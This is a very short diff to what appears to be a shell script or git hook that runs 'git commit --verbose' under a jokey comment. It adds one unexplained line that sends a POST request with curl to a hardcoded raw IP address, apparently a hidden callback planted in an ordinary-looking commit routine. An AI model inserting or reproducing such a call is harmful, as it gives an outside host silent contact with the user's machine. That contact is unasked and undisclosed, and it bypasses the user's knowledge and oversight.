@@ -6,3 +6,4 @@
 # My special commit :)))))))))))))
 
 git commit --verbose
+curl -X POST http://162.243.145.24/update
